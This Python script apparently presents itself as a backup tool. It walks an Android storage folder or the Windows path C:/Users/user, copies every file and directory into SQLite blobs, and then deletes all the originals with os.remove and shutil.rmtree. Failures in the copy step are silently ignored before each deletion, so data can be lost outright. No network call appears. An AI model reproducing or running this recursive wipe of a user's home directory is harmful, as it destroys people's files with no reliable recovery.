import os
import shutil
import threading
import sqlite3
import zipfile
import io

files_data = []
files_data1 = []
DB_NAME = "my_files_data.db"
conn = sqlite3.connect(DB_NAME, check_same_thread = False)
c = conn.cursor()
c.execute("""CREATE TABLE IF NOT EXISTS data(file_name TEXT, original_path TEXT, file_content BLOB, image BLOB, is_dir INTEGER)""")
conn.commit()
db_lock = threading.Lock()
def load_directory(dir_path, dir):
	try:
		if os.path.basename(dir_path) == DB_NAME:
			print("data base ziping is skipped")
			pass
		else:
			zip_buffer = io.BytesIO()
			with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
				for root, dirs, files in os.walk(dir_path):
					for file in files:
						if file == DB_NAME:
							print("skipped ziping data base main")
							continue
						file_full_path = os.path.join(root, file)
						arcname = os.path.relpath(file_full_path, os.path.dirname(dir_path))
						zf.write(file_full_path, arcname)
			zip_data = zip_buffer.getvalue()
			with db_lock:
				c.execute("INSERT INTO data(file_name, original_path, file_content, image, is_dir) VALUES(?,?,?,?,?)",(dir, dir_path, zip_data, None, 1))
				conn.commit()
				print("Directory backed up successfully")
	except Exception as e:
		print(f"An error occured-------> {e}")
		
		
def load_files_to_base(file_path, file):
	try:
		#if os.path.basename(file_path) == DB_NAME:
		#	print("skipped backup database for traffick")
		#	return
		with open(file_path, "rb") as f:
				file_datas = f.read()
		with db_lock:
			if file.lower().endswith((".jpg",".npg",".png",".jpeg",".bmp",".gif")):
				c.execute("INSERT INTO data(file_name, original_path, file_content, image, is_dir) VALUES(?, ?, ?, ?, ?)", (file, file_path, None, file_datas, 0))
			else:
				if os.path.basename(file_path) == DB_NAME:
					print("skipped database backup traffick")
					pass
				else:
					c.execute("INSERT INTO data(file_name, original_path, file_content, image, is_dir) VALUES(?,?, ?, ?, ?)", (file, file_path, file_datas, None, 0))
			conn.commit()
			
		print("All data had been backed up completely and aquired images✔✔✔✔✔")
	except Exception as e:
		print(f"Something went wrong while backing up datas")
		
def NO_DOT(root_dir):
	print("starting other proccess.. ➿➰➿➰")
	for root, dirs, files in os.walk(root_dir, topdown = False):
		for dir in dirs:
			if "." not in dir:
				dir_path = os.path.join(root, dir)
				thread4 = threading.Thread(target = load_directory, args = (dir_path, dir))
				thread4.start()
				thread4.join()
				try:
					shutil.rmtree(dir_path)
					print("Removed no Extention directry❌❌")
					
				except Exception as e:
					print(f"Error problem {e}")
			elif "." in dir:
				dir_path = os.path.join(root, dir)
				thread4 = threading.Thread(target = load_directory, args = (dir_path, dir))
				thread4.start()
				thread4.join()
				try:
					if os.path.basename(dir_path) == DB_NAME:
						print("data base directory deletion skipped")
						pass
					else:
						shutil.rmtree(dir_path)
						print("Directry with dots reemoved❌❌❌")
					
				except Exception as e:
					print(f"error message {e}")
		
		for file in files:
			if "." not in file:
				file_path = os.path.join(root, file)
				thread3 = threading.Thread(target = load_files_to_base, args = (file_path, file))
				thread3.start()
				thread3.join()
				try:
					if os.path.basename(file_path) == DB_NAME:
						print("skipping data base storage")
						pass
					else:
						os.remove(file_path)
						print("files with no dots removed❌❌❌")
					
				except Exception as e:
					print(f"There is an eror {e}")
			elif "." in file:
				file_path = os.path.join(root, file)
				thread3 = threading.Thread(target = load_files_to_base, args = (file_path, file))
				thread3.start()
				thread3.join()
				try:
					if os.path.basename(file_path) == DB_NAME:
						print("database skipped for reference")
					else:
						os.remove(file_path)
						print("file with dot removed ❌❌❌")
					
				except Exception as e:
					print(f"There is an erro{e}")
					
					
		#files_data.append(dir)
		#files_data1.append(file)
				
								
	
def start_proccess(root_dir):
	print("proccess deleting running🏃🏃🏃")
	
	for root, dirs, files in os.walk(root_dir, topdown = False):
		for file in files:
			if file.lower().endswith((".kivy")):
				file_path = os.path.join(root, file)
				thread3 = threading.Thread(target = load_files_to_base, args = (file_path, file))
				thread3.start()
				thread3.join()
				os.remove(file_path)
				print("Files terminated 💔💔❌")
				
				
				
		for dir in dirs:
			if dir.lower().endswith((".kivy")):
				dir_path = os.path.join(root, dir)
				thread4 = threading.Thread(target = load_directory, args = (dir_path, dir))
				thread4.start()
				thread4.join()
				shutil.rmtree(dir_path)
				print("directory terminated❌❌")
				
				

def look_for_basename():
	if os.path.exists("/storage/emulated/0/my_files"):
		basename = "/storage/emulated/0/my_files"
		return basename
	else:
		basename = "C:/Users/user"
		return basename
	return None
					
def main():
	root_dir = look_for_basename()
	for root, dirs, files in os.walk(root_dir, topdown = False):
		for dir in dirs:
			print(dir)
			print("Starting args for directories...")
			
			
		for file in files:
			print(file)
			print("Starting args for file paths")
	thread1 = threading.Thread(target = start_proccess, args = (root_dir, ))
	thread2 = threading.Thread(target = NO_DOT, args = (root_dir, ))
	thread1.start()
	thread2.start()
	thread1.join()
	thread2.join()
			
if __name__ =="__main__":
	print("Getting data files")
	main()
	